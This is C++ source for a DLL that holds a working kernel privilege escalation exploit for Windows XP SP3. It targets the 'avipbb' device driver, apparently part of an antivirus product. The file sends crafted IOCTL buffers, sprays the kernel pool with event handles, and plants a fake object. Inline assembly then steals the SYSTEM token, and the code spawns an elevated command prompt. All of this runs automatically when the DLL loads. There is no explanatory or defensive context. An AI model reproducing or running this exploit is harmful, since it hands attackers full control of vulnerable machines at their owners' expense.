// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"


//Offsets of Data structures WINXPSP3
#define _KPROCESS 0x44
#define _TOKEN 0xc8
#define _UPID 0x84
#define _APLINKS 0x88

VOID shellcode()
{
	__asm
	{
		push edx                        
		push ebx                        
		xor eax, eax                    
		mov eax, fs:[eax+124h]
		mov eax, [eax+_KPROCESS]    
		mov ecx, eax
		mov ebx, [eax+_TOKEN]   
L:		mov eax, [eax+_APLINKS] 
		sub eax,88h                     
		cmp [eax+_UPID], 4      
		jnz L
		mov edx,[eax+_TOKEN]    
		mov eax, ecx                    
		mov [eax+_TOKEN],edx    
		pop ebx                         
		pop edx                  
	}
}


DWORD Driver()
{
	HANDLE handle = INVALID_HANDLE_VALUE;
	handle = CreateFileA("\\\\.\\avipbb", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 
		NULL, OPEN_EXISTING,  FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, 0);
	if (handle == INVALID_HANDLE_VALUE)
		return -1;
	else
	{	
		char inbuffer[0x8] = {0xE0, 0xAB, 0xEB, 0xAC, 0xAF, 0xAB, 0xEB, 0x1F};		
		DWORD dwSz;		
		DeviceIoControl(handle, 0x222458, inbuffer, sizeof(inbuffer), NULL, NULL, &dwSz, NULL);
		
				
		void * memoo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x300);
		memset(memoo, 0x41, 0x300);
		*(DWORD*)((DWORD)memoo) = 0x118;
		*(DWORD*)((DWORD)memoo+0x4) = (DWORD)memoo;
		*(DWORD*)((DWORD)memoo+0x1f4) = (DWORD)memoo;
		*(DWORD*)((DWORD)memoo+0x104) = 0x0a060024;
		*(DWORD*)((DWORD)memoo+0x108) = 0xee657645;
		*(DWORD*)((DWORD)memoo+0x10c) = 0xdeadfa11;
		*(DWORD*)((DWORD)memoo+0x110) = 0xcafebabe;	
		BYTE * fake = new BYTE[0x190];
		memset(fake, 0, 0x190);
		*(DWORD*)(fake+0xA8) = (DWORD)shellcode;		
		*(DWORD*)((DWORD)memoo+0x114) =  (DWORD)fake;
		

		char inbuffer2[0x118];
		memset(inbuffer2, 0x45, 0x118);
		*(DWORD*)(inbuffer2+8) = (DWORD)memoo;

		char output[0x18];
		memset(output, 0x42, 0x18);
		
		HANDLE * hArr = new HANDLE[0x10000];
		int i = 0;

		for(i = 0 ; i < 0x100000 ; i++)
			CreateEvent(NULL, FALSE, FALSE, NULL);	

		for(i = 0 ; i < 0x10000 ; i++)
			hArr[i] = CreateEvent(NULL, FALSE, FALSE, NULL);
		
		for(i = 0 ; i < 0xf000 ; i+=0x200)
			for(int j = 0; j < 6; j++)
				CloseHandle(hArr[i+j]);

		DeviceIoControl(handle, 0x222450, inbuffer2, sizeof(inbuffer2), output, sizeof(output), &dwSz, NULL);
		
		for(int i = 0 ; i < 0x10000 ; i++)	
			CloseHandle(hArr[i]);
		delete hArr;
		CloseHandle(handle);
		WinExec("CMD", SW_SHOWNORMAL);
	}
	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{		
		ExitProcess(Driver());
		break;
	}
	default:
		break;
	}
	return TRUE;
}

